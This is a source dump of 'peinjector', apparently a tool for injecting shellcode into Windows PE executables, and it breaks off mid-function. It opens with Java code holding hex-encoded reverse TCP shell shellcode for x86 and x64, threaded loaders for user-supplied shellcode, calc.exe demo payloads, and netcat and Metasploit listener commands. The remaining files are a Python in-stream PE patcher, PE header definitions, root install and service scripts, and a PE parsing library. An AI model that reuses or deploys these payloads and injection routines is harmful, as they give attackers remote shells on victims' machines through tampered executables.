		// shellcode
		try {
			ByteArrayOutputStream shellcode = new ByteArrayOutputStream();
			shellcode.write(DatatypeConverter.parseHexBinary("9050535152565755415041514152415341544155415641579c90e8c00"
					+ "00000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c204"
					+ "1c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35"
					+ "648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d0664"
					+ "18b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957f"
					+ "fffff5d49c7c6a60100006a404159680010000041584c89f26a00596858a453e5415affd54889c34889c748c7c1a6010"
					+ "000eb435ef2a4e8000000004831c050504989c14889c24989d84889c149c7c238680d16ffd54883c4589d415f415e415"
					+ "d415c415b415a415941585d5f5e5a595b58e9ab010000e8b8fffffffc4883e4f0e8c0000000415141505251564831d26"
					+ "5488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488"
					+ "b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c"
					+ "94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b0"
					+ "4884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d49be7773325f3332000"
					+ "041564989e64881eca00100004989e549bc0200"));
			shellcode.write(port_byte);	//port
			shellcode.write(ip_byte);	//ip
			shellcode.write(DatatypeConverter.parseHexBinary("41544989e44c89f141ba4c772607ffd54c89ea68010100005941ba298"
					+ "06b00ffd550504d31c94d31c048ffc04889c248ffc04889c141baea0fdfe0ffd54889c76a1041584c89e24889f941ba9"
					+ "9a57461ffd54881c4400200004883ec104889e24d31c96a0441584889f941ba02d9c85fffd54883c4205e6a404159680"
					+ "010000041584889f24831c941ba58a453e5ffd54889c34989c74d31c94989f04889da4889f941ba02d9c85fffd54801c"
					+ "34829c64885f675e141ffe7"));
			return shellcode.toByteArray();
			
		} catch (Exception e) {
			e.printStackTrace();
			return new byte[0];
		}
	}
	
	/**
	 * <p>reverse shell</p>
	 * <p>Spawns a reverse shell (Windows cmd, via tcp) which will try to connect to the 
	 * given host:port. Host must be an IPv4 address, the port must be between 1 and 65535.</p>
	 * 
	 * <p>listen command<br>
	 * nc -lvp 1337</p>
	 * 
	 * <p><u>alternativ listen command</u><br>
	 * use payload/windows/shell_reverse_tcp<br>
	 * msf payload(shell_reverse_tcp) > set lhost 0.0.0.0<br>
	 * msf payload(shell_reverse_tcp) > set lport 1337<br>
	 * msf payload(shell_reverse_tcp) > run</p>
	 * 
	 * (for 32bit OS)
	 * 
	 * @param ip ipv4 address
	 * @param port Port
	 */
	public static byte[] reverse_shell_tcp_x86(String ip, int port) {
		// params
		byte[] ip_byte = pack_ip_addresses(ip);
		byte[] port_byte = pack_port(port, ByteOrder.BIG_ENDIAN);
		
		// shellcode
		try {
			ByteArrayOutputStream shellcode = new ByteArrayOutputStream();
			shellcode.write(DatatypeConverter.parseHexBinary("9090609cfce8890000006089e531d2648b52308b520c8b52148b72280"
					+ "fb74a2631ff31c0ac3c617c022c20c1cf0d01c7e2f052578b52108b423c01d08b407885c0744a01d0508b48188b58200"
					+ "1d3e33c498b348b01d631ff31c0acc1cf0d01c738e075f4037df83b7d2475e2588b582401d3668b0c4b8b581c01d38b0"
					+ "48b01d0894424245b5b61595a51ffe0585f5a8b12eb865d6833320000687773325f54684c772607ffd5b89001000029c"
					+ "454506829806b00ffd5505050504050405068ea0fdfe0ffd589c768"));
			shellcode.write(ip_byte);	//ip
			shellcode.write(DatatypeConverter.parseHexBinary("680200"));
			shellcode.write(port_byte);	//port
			shellcode.write(DatatypeConverter.parseHexBinary("89e66a1056576899a57461ffd568636d640089e357575731f66a12595"
					+ "6e2fd66c744243c01018d442410c60044545056565646564e565653566879cc3f86ffd589e04e9046ff306808871d60f"
					+ "fd5bbf0b5a25668a695bd9dffd53c067c0a80fbe07505bb4713726f6a005381c4fc0100009d61"));
			return shellcode.toByteArray();
			
		} catch (Exception e) {
			e.printStackTrace();
			return new byte[0];
		}
	}

	/**
	 * <p>reverse shell</p>
	 * <p>Spawns a reverse shell (Windows cmd, via tcp) which will try to connect to the 
	 * given host:port. Host must be an IPv4 address, the port must be between 1 and 65535.</p>
	 * 
	 * <p>listen command<br>
	 * nc -lvp 1337</p>
	 * 
	 * <p><u>alternativ listen command</u><br>
	 * use payload/windows/shell_reverse_tcp<br>
	 * msf payload(shell_reverse_tcp) > set lhost 0.0.0.0<br>
	 * msf payload(shell_reverse_tcp) > set lport 1337<br>
	 * msf payload(shell_reverse_tcp) > run</p>
	 * 
	 * (for 64bit OS)
	 * 
	 * @param ip ipv4 address
	 * @param port Port
	 */
	public static byte[] reverse_shell_tcp_x64(String ip, int port) {
		// params
		byte[] ip_byte = pack_ip_addresses(ip);
		byte[] port_byte = pack_port(port, ByteOrder.BIG_ENDIAN);
		
		// shellcode
		try {
			ByteArrayOutputStream shellcode = new ByteArrayOutputStream();
			shellcode.write(DatatypeConverter.parseHexBinary("90905053515256575455415041514152415341544155415641579cfc4"
					+ "883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3"
					+ "c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b4"
					+ "0204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b4"
					+ "0244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595"
					+ "a488b12e957ffffff5d49be7773325f3332000041564989e64881eca00100004989e549bc0200"));
			shellcode.write(port_byte);	//port
			shellcode.write(ip_byte);	//ip
			shellcode.write(DatatypeConverter.parseHexBinary("41544989e44c89f141ba4c772607ffd54c89ea68010100005941ba298"
					+ "06b00ffd550504d31c94d31c048ffc04889c248ffc04889c141baea0fdfe0ffd54889c76a1041584c89e24889f941ba9"
					+ "9a57461ffd54881c44002000049b8636d640000000000415041504889e25757574d31c06a0d594150e2fc66c74424540"
					+ "101488d442418c600684889e6565041504150415049ffc0415049ffc84d89c14c89c141ba79cc3f86ffd54831d290909"
					+ "08b0e41ba08871d60ffd5bbf0b5a25641baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189da4"
					+ "881c4f80000009d415f415e415d415c415b415a415941585d5c5f5e5a595b58"));
			return shellcode.toByteArray();
			
		} catch (Exception e) {
			e.printStackTrace();
			return new byte[0];
		}
	}
	
	
	/**
	 * Injects a classic execute calc.exe shellcode
	 * (for 32bit OS)
	 */
	public static byte[] demo_calc_x86() {
		return DatatypeConverter.parseHexBinary("31d2526863616c6389e65256648b72308b760c8b760cad8b308b7e188b5f3c8b5c1f78"
				+ "8b741f2001fe8b4c1f2401f90fb72c5142ad813c0757696e4575f18b741f1c01fe033caeffd7");
	}
	
	
	
	/**
	 * Injects a classic execute calc.exe shellcode
	 * (for 64bit OS)
	 */
	public static byte[] demo_calc_x64() {
		return DatatypeConverter.parseHexBinary("505152535657556a605a6863616c6354594883ec2865488b32488b7618488b761048ad"
				+ "488b30488b7e3003573c8b5c17288b741f204801fe8b541f240fb72c178d5202ad813c0757696e4575ef8b741f1c4801fe8b"
				+ "34ae4801f799ffd74883c4305d5f5e5b5a5958");
	}
	
	/**
	 * Injects a NOP (Debugging purposes) 
	 * (for 32bit and 64bit OS)
	 * 
	 * @param repeats number of nop's
	 */
	public static byte[] demo_nop(int repeats) {
		// nop's
		StringBuilder sb = new StringBuilder();
		for(int i=0; i<repeats; i++) {
			sb.append("90");
		}
		
		//return shellcode
		return DatatypeConverter.parseHexBinary(sb.toString());
	}

	/**
	 * User supplied shellcode. Just paste shellcode as hex string
	 * (for 32bit ans 64bit OS)
	 * 
	 * @param hex_string_shellcode
	 */
	public static byte[] user_supplied_shellcode(String hex_string_shellcode) {
		// null not allowed
		if(null == hex_string_shellcode) {
			hex_string_shellcode = "";
		}
		
		// filter bad chars
		hex_string_shellcode = hex_string_shellcode.toLowerCase();
		hex_string_shellcode = hex_string_shellcode.replaceAll("[^0-9a-f]", "");
		
		// return shellcode
		return DatatypeConverter.parseHexBinary(hex_string_shellcode);
	}

	/**
	 * User supplied shellcode. Just paste shellcode as hex string. It will be injected as new thread. 
	 * Make sure to use a process safe exit function.
	 * 
	 * (for 32bit OS)
	 * 
	 * @param hex_string_shellcode
	 */
	public static byte[] user_supplied_shellcode_threaded_x86(String hex_string_shellcode) {
		// usershellcode
		byte[] usershellcode = user_supplied_shellcode(hex_string_shellcode);
		
		try {
			// ByteArrayOutputStream
			ByteArrayOutputStream shellcode1 = new ByteArrayOutputStream();
			ByteArrayOutputStream shellcode2 = new ByteArrayOutputStream();
			ByteArrayOutputStream shellcode = new ByteArrayOutputStream();
			
			// shellcode2
	        shellcode2.write(DatatypeConverter.parseHexBinary("E8B7FFFFFF"));
	        shellcode2.write(usershellcode);

	        // shellcode1
			shellcode1.write(DatatypeConverter.parseHexBinary("9090609CFC"
					+ "90E8C10000006089E531D290648B52308B520C8B5214EB0241108B72280FB74A2631FF31C0AC3C617C022C20C1CF0D01"
					+ "C74975EF5290578B5210908B423C01D0908B4078EB07EA484204857C3A85C00F84680000009001D050908B48188B5820"
					+ "01D3E358498B348B01D631FF9031C0EB04FF69D538ACC1CF0D01C738E0EB057F1BD2EBCA75E6037DF83B7D2475D45890"
					+ "8B582401D390668B0C4B8B581C01D390EB04CD97F1B18B048B01D090894424245B5B6190595A51EB010FFFE058905F5A"
					+ "8B12E953FFFFFF905D90BE"));
			shellcode1.write( ByteBuffer.allocate(4).order(ByteOrder.LITTLE_ENDIAN).putInt( shellcode2.size() - 5 ).array());
	        shellcode1.write(DatatypeConverter.parseHexBinary("906A4090680010000056906A006858A453E5FFD589C389C79089F1eb"
	        		+ "44905e909090F2A4E820000000BBE01D2A0A9068A695BD9DFFD53C067C0A80FBE07505BB4713726F6A0053FFD531C050"
	        		+ "50505350506838680D16FFD558589061e9"));
	        shellcode1.write( ByteBuffer.allocate(4).order(ByteOrder.LITTLE_ENDIAN).putInt( shellcode2.size() ).array());
	        	
	        // return shellcode
	        shellcode.write(shellcode1.toByteArray());
	        shellcode.write(shellcode2.toByteArray());
			return shellcode.toByteArray();
				
		} catch (Exception e) {
			e.printStackTrace();
			return new byte[0];
		}
	}
	
	/**
	 * User supplied shellcode. Just paste shellcode as hex string. It will be injected as new thread. 
	 * Make sure to use a process safe exit function
	 * 
	 * (for 64bit OS)
	 * 
	 * @param hex_string_shellcode
	 */
	public static byte[] user_supplied_shellcode_threaded_x64(String hex_string_shellcode) {
		// usershellcode
		byte[] usershellcode = user_supplied_shellcode(hex_string_shellcode);
		
		try {
			// ByteArrayOutputStream
			ByteArrayOutputStream shellcode1 = new ByteArrayOutputStream();
			ByteArrayOutputStream shellcode2 = new ByteArrayOutputStream();
			ByteArrayOutputStream shellcode = new ByteArrayOutputStream();
			
			// shellcode2
	        shellcode2.write(DatatypeConverter.parseHexBinary("E8B8FFFFFF"));
	        shellcode2.write(usershellcode);
			
	        // shellcode1
			shellcode1.write(DatatypeConverter.parseHexBinary("9050535152565755415041514152415341544155415641579c90e8c0"
					+ "000000415141505251564831D265488B5260488B5218488B5220488b7250480fb74a4a4d31c94831c0ac3c617c022c20"
					+ "41c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e3"
					+ "5648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066"
					+ "418b0c48448b401c4901d0418b04884801d0415841585E595A41584159415A4883EC204152FFE05841595A488B12e957"
					+ "ffffff5d49c7c6"));
			shellcode1.write( ByteBuffer.allocate(4).order(ByteOrder.LITTLE_ENDIAN).putInt( shellcode2.size() - 5 ).array());
	        shellcode1.write(DatatypeConverter.parseHexBinary("6a404159680010000041584C89F26A00596858a453e5415Affd54889"
	        		+ "c34889c748c7c1"));
	        shellcode1.write( ByteBuffer.allocate(4).order(ByteOrder.LITTLE_ENDIAN).putInt( shellcode2.size() - 5 ).array());
	        shellcode1.write(DatatypeConverter.parseHexBinary("eb435ef2a4e8000000004831C050504989C14889C24989D84889C149"
	        		+ "C7C238680D16FFD54883C4589d415f415e415d415c415b415a415941585d5f5e5a595b58e9"));
	        shellcode1.write( ByteBuffer.allocate(4).order(ByteOrder.LITTLE_ENDIAN).putInt( shellcode2.size() ).array());
	        	
	        // return shellcode
	        shellcode.write(shellcode1.toByteArray());
	        shellcode.write(shellcode2.toByteArray());
			return shellcode.toByteArray();
				
		} catch (Exception e) {
			e.printStackTrace();
			return new byte[0];
		}
	}

}

```

`peinjector/connectors/java/eu/peinjector/libpe/exceptions/LibPeBadInputException.java`:

```java
package eu.peinjector.libpe.exceptions;

/**
 * bad user input
 */
public class LibPeBadInputException extends LibPeException {

	private static final long serialVersionUID = -8790189648003200022L;

	public LibPeBadInputException() {
		super();
	}
	
	public LibPeBadInputException(String message) {
		super(message);
	}
}

```

`peinjector/connectors/java/eu/peinjector/libpe/exceptions/LibPeException.java`:

```java
package eu.peinjector.libpe.exceptions;

/**
 * From this class expand all libpe-subclasses
 */
public class LibPeException extends Exception {

	private static final long serialVersionUID = -7020499578589899002L;

	public LibPeException() {
		super();
	}
	
	public LibPeException(String message) {
		super(message);
	}
}

```

`peinjector/connectors/java/eu/peinjector/libpe/exceptions/LibPeProtocolException.java`:

```java
package eu.peinjector.libpe.exceptions;

/**
 * libpe-protocol exceptions  (unknown command, corrupt fields, ...)
 */
public class LibPeProtocolException extends LibPeException {

	private static final long serialVersionUID = 1134748679697805831L;

	public LibPeProtocolException() {
		super();
	}
	
	public LibPeProtocolException(String message) {
		super(message);
	}
}

```

`peinjector/connectors/java/eu/peinjector/libpe/exceptions/LibPeSocketException.java`:

```java
package eu.peinjector.libpe.exceptions;

import java.io.IOException;
import java.net.SocketTimeoutException;
import java.net.UnknownHostException;

/**
 * Socket exceptions
 * 
 * @see IOException
 * @see SocketTimeoutException
 * @see UnknownHostException
 */
public class LibPeSocketException extends LibPeException {

	private static final long serialVersionUID = 6314115271909409845L;

	public LibPeSocketException() {
		super();
	}
	
	public LibPeSocketException(String message) {
		super(message);
	}
}

```

`peinjector/connectors/python/libPePatch.py`:

```py
#!/usr/bin/env python
# -*- encoding: utf-8 -*-

"""
    Provides de-serialization and in-stream patch applying capabilities for PE Files
"""

__author__ = 'A.A.'

# Unpack binary data
from struct import unpack_from


# Holds an single patch part
class PePatchPart(object):
    # Constructor
    def __init__(self, mem, position, insert):
        self.mem = mem
        self.next = None
        self.position = position
        self.insert = insert
        self.finished = False


# Deserialize and applies patches on pe files
class PePatch(object):

    # Sentinel size
    pepatch_sentinelsize = 9;

    # First Patch part
    first = None

    # Constructor
    def __init__(self, serialized_memory):
        serialized_mem_size = len(serialized_memory)
        current_position = 0
        current = None
        patch = None

        # Deserialize data
        while (serialized_mem_size - current_position) >= self.pepatch_sentinelsize:
            mem_size, position, insert = unpack_from("<II?", serialized_memory, current_position)
            # 2*sizeof(uint32_t) + sizeof(uint8_t)
            current_position += 9

            # Length Error
            if (serialized_mem_size - current_position) < mem_size:
                return

            # Extract Data
            patch_data = serialized_memory[current_position:current_position + mem_size]

            # Change Position
            current_position += mem_size

            # Add Patch
            if mem_size > 0:
                patch = PePatchPart(patch_data, position, insert)
            else:
                patch = None
                
            # Build chain
            if current is not None:
                current.next = patch
            if self.first is None:
                self.first = patch
            current = patch

        # Length Error
        if (serialized_mem_size - current_position) > 0:
            self.first = None
            return

    # Patch is ok
    def patch_ok(self):
        return self.first is not None

    # Apply patch on stream data
    def apply_patch(self, mem, position):
        all_finished = True
        
        # Nothing to patch
        if self.first is None:
            return mem

        # Apply each patch part
        current = self.first
        while current is not None:
            # Finished, no need to check
            if current.finished:
                current = current.next
                continue
            
            # Patch starts inside memory
            if position <= current.position < (position + len(mem)):
                delta_position = current.position - position
                # Insert
                if current.insert:
                    mem = mem[:delta_position] + current.mem + mem[delta_position:]
                    
                    # Patch part finished
                    current.finished = True
                
                # Overwrite
                else:
                    mem = mem[:delta_position] + current.mem[:len(mem)-delta_position] \
                        + mem[delta_position+len(current.mem):]

                # Patch applied
                all_finished = False 
            
            # Append after current mem part (important if current part is the last part)
            elif current.insert and (current.position == (position + len(mem))):
                # Append patch
                mem = mem + current.mem
                
                # Patch part finished
                current.finished = True
            
                # Patch applied
                all_finished = False 
                
            # Patch starts before memory
            elif (not current.insert) and ((current.position + len(current.mem)) > position)\
                    and (current.position < position):
                delta_position = position - current.position
                mem = current.mem[delta_position:delta_position+len(mem)] + mem[len(current.mem)-delta_position:]
                
                # Patch applied
                all_finished = False 
            
            # Patch finished
            elif (current.position + len(current.mem)) < position:
                current.finished = True
            
            # Reset total finished  
            else:
                # Patch waiting
                all_finished = False
            
            # Next patch part     
            current = current.next
        
        # Patch finished
        if all_finished:
            self.first = None
        
        # Return patched memory
        return mem

```

`peinjector/def/headers.h`:

```h
/**
 * \file   headers.h
 * \author A.A.
 * \brief PE COFF constants and structures
 */

#ifndef DEF_HEADERS_H_
#define DEF_HEADERS_H_
#include <inttypes.h>
#include <stdlib.h>

#define NT_FILE_ALIGNMENT 0x200
#define NT_SECTION_ALIGNMENT 0x1000

#define NT_SHORT_NAME_LEN 8

#define MZ_MAGIC 0x5A4D
#define NT_MAGIC 0x00004550

#define NT_OPTIONAL_32_MAGIC 0x10B
#define NT_OPTIONAL_64_MAGIC 0x20B

#define NT_OPTIONAL_MAXSECTIONS 0x10

#define DIR_EXPORT 0
#define DIR_IMPORT 1
#define DIR_RESOURCE 2
#define DIR_EXCEPTION 3
#define DIR_SECURITY 4
#define DIR_BASERELOC 5
#define DIR_DEBUG 6
#define DIR_ARCHITECTURE 7
#define DIR_GLOBALPTR 8
#define DIR_TLS 9
#define DIR_LOAD_CONFIG 10
#define DIR_BOUND_IMPORT 11
#define DIR_IAT 12
#define DIR_DELAY_IMPORT 13
#define DIR_COM_DESCRIPTOR 14

#define IMAGE_FILE_DLL 0x2000

#define IMAGE_SCN_TYPE_NO_PAD 0x00000008
#define IMAGE_SCN_CNT_CODE 0x00000020
#define IMAGE_SCN_CNT_INITIALIZED_DATA 0x00000040
#define IMAGE_SCN_CNT_UNINITIALIZED_DATA 0x00000080
#define IMAGE_SCN_LNK_OTHER 0x00000100
#define IMAGE_SCN_LNK_INFO 0x00000200
#define IMAGE_SCN_LNK_REMOVE 0x00000800
#define IMAGE_SCN_LNK_COMDAT 0x00001000
#define IMAGE_SCN_NO_DEFER_SPEC_EXC 0x00004000
#define IMAGE_SCN_GPREL 0x00008000
#define IMAGE_SCN_MEM_FARDATA 0x00008000
#define IMAGE_SCN_MEM_PURGEABLE 0x00020000
#define IMAGE_SCN_MEM_16BIT 0x00020000
#define IMAGE_SCN_MEM_LOCKED 0x00040000
#define IMAGE_SCN_MEM_PRELOAD 0x00080000
#define IMAGE_SCN_ALIGN_1BYTES 0x00100000
#define IMAGE_SCN_ALIGN_2BYTES 0x00200000
#define IMAGE_SCN_ALIGN_4BYTES 0x00300000
#define IMAGE_SCN_ALIGN_8BYTES 0x00400000
#define IMAGE_SCN_ALIGN_16BYTES 0x00500000
#define IMAGE_SCN_ALIGN_32BYTES 0x00600000
#define IMAGE_SCN_ALIGN_64BYTES 0x00700000
#define IMAGE_SCN_ALIGN_128BYTES 0x00800000
#define IMAGE_SCN_ALIGN_256BYTES 0x00900000
#define IMAGE_SCN_ALIGN_512BYTES 0x00A00000
#define IMAGE_SCN_ALIGN_1024BYTES 0x00B00000
#define IMAGE_SCN_ALIGN_2048BYTES 0x00C00000
#define IMAGE_SCN_ALIGN_4096BYTES 0x00D00000
#define IMAGE_SCN_ALIGN_8192BYTES 0x00E00000
#define IMAGE_SCN_ALIGN_MASK 0x00F00000
#define IMAGE_SCN_LNK_NRELOC_OVFL 0x01000000
#define IMAGE_SCN_MEM_DISCARDABLE 0x02000000
#define IMAGE_SCN_MEM_NOT_CACHED 0x04000000
#define IMAGE_SCN_MEM_NOT_PAGED 0x08000000
#define IMAGE_SCN_MEM_SHARED 0x10000000
#define IMAGE_SCN_MEM_EXECUTE 0x20000000
#define IMAGE_SCN_MEM_READ 0x40000000
#define IMAGE_SCN_MEM_WRITE 0x80000000

#define IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE 0x0040
#define IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY 0x0080
#define IMAGE_DLL_CHARACTERISTICS_NX_COMPAT 0x0100
#define IMAGE_DLLCHARACTERISTICS_NO_ISOLATION 0x0200
#define IMAGE_DLLCHARACTERISTICS_NO_SEH 0x0400
#define IMAGE_DLLCHARACTERISTICS_NO_BIND 0x0800
#define IMAGE_DLLCHARACTERISTICS_WDM_DRIVER 0x2000
#define IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE 0x8000

typedef struct _DOS_HEADER {
  uint16_t e_magic;
  uint16_t e_cblp;
  uint16_t e_cp;
  uint16_t e_crlc;
  uint16_t e_cparhdr;
  uint16_t e_minalloc;
  uint16_t e_maxalloc;
  uint16_t e_ss;
  uint16_t e_sp;
  uint16_t e_csum;
  uint16_t e_ip;
  uint16_t e_cs;
  uint16_t e_lfarlc;
  uint16_t e_ovno;
  uint16_t e_res[4];
  uint16_t e_oemid;
  uint16_t e_oeminfo;
  uint16_t e_res2[10];
  uint32_t e_lfanew;
} DOS_HEADER;

typedef struct _PE_HEADER {
  uint32_t Signature;
  uint16_t Machine;
  uint16_t NumberOfSections;
  uint32_t TimeDateStamp;
  uint32_t PointerToSymbolTable;
  uint32_t NumberOfSymbols;
  uint16_t SizeOfOptionalHeader;
  uint16_t Characteristics;
} PE_HEADER;

typedef struct _DATA_DIRECTORY {
  uint32_t VirtualAddress;
  uint32_t Size;
} DATA_DIRECTORY;

typedef struct _OPTIONAL_HEADER_32 {
  uint16_t Magic;
  uint8_t MajorLinkerVersion;
  uint8_t MinorLinkerVersion;
  uint32_t SizeOfCode;
  uint32_t SizeOfInitializedData;
  uint32_t SizeOfUninitializedData;
  uint32_t AddressOfEntryPoint;
  uint32_t BaseOfCode;
  uint32_t BaseOfData;
  uint32_t ImageBase;
  uint32_t SectionAlignment;
  uint32_t FileAlignment;
  uint16_t MajorOperatingSystemVersion;
  uint16_t MinorOperatingSystemVersion;
  uint16_t MajorImageVersion;
  uint16_t MinorImageVersion;
  uint16_t MajorSubsystemVersion;
  uint16_t MinorSubsystemVersion;
  uint32_t Win32VersionValue;
  uint32_t SizeOfImage;
  uint32_t SizeOfHeaders;
  uint32_t CheckSum;
  uint16_t Subsystem;
  uint16_t DllCharacteristics;
  uint32_t SizeOfStackReserve;
  uint32_t SizeOfStackCommit;
  uint32_t SizeOfHeapReserve;
  uint32_t SizeOfHeapCommit;
  uint32_t LoaderFlags;
  uint32_t NumberOfRvaAndSizes;
  DATA_DIRECTORY DataDirectory[NT_OPTIONAL_MAXSECTIONS];
} OPTIONAL_HEADER_32;

typedef struct _OPTIONAL_HEADER_64 {
  uint16_t Magic;
  uint8_t MajorLinkerVersion;
  uint8_t MinorLinkerVersion;
  uint32_t SizeOfCode;
  uint32_t SizeOfInitializedData;
  uint32_t SizeOfUninitializedData;
  uint32_t AddressOfEntryPoint;
  uint32_t BaseOfCode;
  uint64_t ImageBase;
  uint32_t SectionAlignment;
  uint32_t FileAlignment;
  uint16_t MajorOperatingSystemVersion;
  uint16_t MinorOperatingSystemVersion;
  uint16_t MajorImageVersion;
  uint16_t MinorImageVersion;
  uint16_t MajorSubsystemVersion;
  uint16_t MinorSubsystemVersion;
  uint32_t Win32VersionValue;
  uint32_t SizeOfImage;
  uint32_t SizeOfHeaders;
  uint32_t CheckSum;
  uint16_t Subsystem;
  uint16_t DllCharacteristics;
  uint64_t SizeOfStackReserve;
  uint64_t SizeOfStackCommit;
  uint64_t SizeOfHeapReserve;
  uint64_t SizeOfHeapCommit;
  uint32_t LoaderFlags;
  uint32_t NumberOfRvaAndSizes;
  DATA_DIRECTORY DataDirectory[NT_OPTIONAL_MAXSECTIONS];
} OPTIONAL_HEADER_64;

typedef struct _SECTION_HEADER {
  uint8_t Name[NT_SHORT_NAME_LEN];
  union {
    uint32_t PhysicalAddress;
    uint32_t VirtualSize;
  } Misc;
  uint32_t VirtualAddress;
  uint32_t SizeOfRawData;
  uint32_t PointerToRawData;
  uint32_t PointerToRelocations;
  uint32_t PointerToLinenumbers;
  uint16_t NumberOfRelocations;
  uint16_t NumberOfLinenumbers;
  uint32_t Characteristics;
} SECTION_HEADER;

#endif /* DEF_HEADERS_H_ */

```

`peinjector/install/peinjector_install.sh`:

```sh
#!/bin/sh

# peinjector install script
# Autor: A.A.

# Check root
if [ "$(id -u)" != "0" ]; then
	echo "must be run as root user"
	exit 1
fi

# Dependencies
apt-get install -y gcc

# install start script
cp ./peinjector_start.sh /usr/local/bin/peinjector_start.sh
chmod a+x /usr/local/bin/peinjector_start.sh

# install stop script
cp ./peinjector_stop.sh /usr/local/bin/peinjector_stop.sh
chmod a+x /usr/local/bin/peinjector_stop.sh

# install service script
cp ./peinjector_service.sh /etc/init.d/peinjector
chmod a+x /etc/init.d/peinjector

# register service
update-rc.d peinjector defaults

cd ..
# build
chmod a+x ./peinjector_make.sh
./peinjector_make.sh

# install server binary
cp ./build/peinjector /usr/bin/peinjector
chmod a+x /usr/bin/peinjector

# make working and log dir
mkdir /etc/peinjector
mkdir /var/log/peinjector

# copy config file
cp ./config.ini /etc/peinjector/config.ini

# run server
service peinjector start

exit 0
```

`peinjector/install/peinjector_service.sh`:

```sh
#!/bin/sh

### BEGIN INIT INFO
# Provides:          peinjector
# Required-Start:    $all
# Required-Stop:     $all
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: peinjector server
# Description:       Provides peinjector server as a service
#
### END INIT INFO

# peinjector service script
# Autor: A.A.

# Check root
if [ "$(id -u)" != "0" ]; then
	echo "must be run as root user"
	exit 1
fi

case "$1" in
  start)
    echo "Start peinjector server"
    /usr/local/bin/peinjector_start.sh
    ;;
  stop)
    echo "Stop peinjector server"
    /usr/local/bin/peinjector_stop.sh
    ;;
  restart)
    echo "Restart peinjector server"
    /usr/local/bin/peinjector_stop.sh
    /usr/local/bin/peinjector_start.sh
    ;;
  *)
    echo "Usage: /etc/init.d/peinjector {start|stop|restart}"
    ;;
esac

exit 0
```

`peinjector/install/peinjector_start.sh`:

```sh
#!/bin/sh

# peinjector start script
# Autor: A.A.

# Check root
if [ "$(id -u)" != "0" ]; then
	echo "must be run as root user"
	exit 1
fi

# set Log files and working dir
LOG_FILE=/var/log/peinjector/injector.log
ERROR_FILE=/var/log/peinjector/injector.err
WORKING_DIR=/etc/peinjector

# start server
cd $WORKING_DIR
(/usr/bin/peinjector --server >> $LOG_FILE 2>> $ERROR_FILE </dev/null) &

exit 0
```

`peinjector/install/peinjector_stop.sh`:

```sh
#!/bin/sh

# peinjector stop script
# Autor: A.A.

# Check root
if [ "$(id -u)" != "0" ]; then
	echo "must be run as root user"
	exit 1
fi

# kill peinjector
pkill peinjector

exit 0
```

`peinjector/libpefile.c`:

```c
/*
 * \file   libpefile.c
 * \author A.A.
 * \brief  Manages disassembly and reassembly of the PE COFF File Format
 */

#include <stdio.h>
#include <string.h>
#include <stddef.h>
#include "libpefile.h"

/* Min/Max Macros */
#define MIN(_a, _b) ((_a) < (_b) ? (_a) : (_b))
#define MAX(_a, _b) ((_a) > (_b) ? (_a) : (_b))

/* Calculate raw size of image an validates positions and sizes. Returns 0 on error */
static inline size_t __pefile_calculate_raw_size(PEFILE *in, PEFILE_WRITE_OPTIONS *options) {
  size_t i = 0;
  size_t ii = 0;
  size_t additional_end, section_end;

  /* Raw size of Headers and padding */
  size_t size = in->dos_header.e_lfanew + sizeof(PE_HEADER) + in->pe_header.SizeOfOptionalHeader
      + in->pe_header.NumberOfSections * sizeof(SECTION_HEADER) + in->header_padding.memsize;

  /* Calculate header size only */
  if (options && options->header_only) {

    /* If additional data is forced we need to add this size too. In this case, only 1 additional data
     *  segment is allowed, and only if it's directly after the raw header (happens when parsing a
     *  truncated pe file with header_only option) */
    if (options->force_additional) {
      if (in->additional_count > 1 || ((in->additional_count > 0) && (in->additional_data == NULL))) {
        return 0;
      } else if (in->additional_count > 0) {
        if (size == in->additional_data[0].position) {
          size += in->additional_data[0].memsize;
        } else {
          return 0;
        }
      }
    }
    return size;
  }

  /* Validate & add all Section sizes */
  if ((in->pe_header.NumberOfSections > 0) && (in->section_header == NULL)) {
    return 0;
  }
  for (i = 0; i < in->pe_header.NumberOfSections; ++i) {
    /* Nested sections */
    for (ii = 0; ii < in->pe_header.NumberOfSections; ++ii) {
      if ((i != ii) && (in->section_header[ii].PointerToRawData <= in->section_header[i].PointerToRawData)
          && ((in->section_header[ii].PointerToRawData + in->section_header[ii].SizeOfRawData)
              >= (in->section_header[i].PointerToRawData + in->section_header[i].SizeOfRawData))) {
        size -= in->section_header[i].SizeOfRawData;
      }
    }
    size += in->section_header[i].SizeOfRawData;
  }

  /* Validate & add all additional data */
  if ((in->additional_count > 0) && (in->additional_data == NULL)) {
    return 0;
  }
  for (i = 0; i < in->additional_count; ++i) {
    size += in->additional_data[i].memsize;
  }

  /* Validate additional data positions */
  for (i = 0; i < in->additional_count; ++i) {
    if ((in->additional_data[i].position + in->additional_data[i].memsize) > size) {
      return 0;

    } else {
      /* If additional data starts or ends inside section something is wrong */
      additional_end = in->additional_data[i].position + in->additional_data[i].memsize;
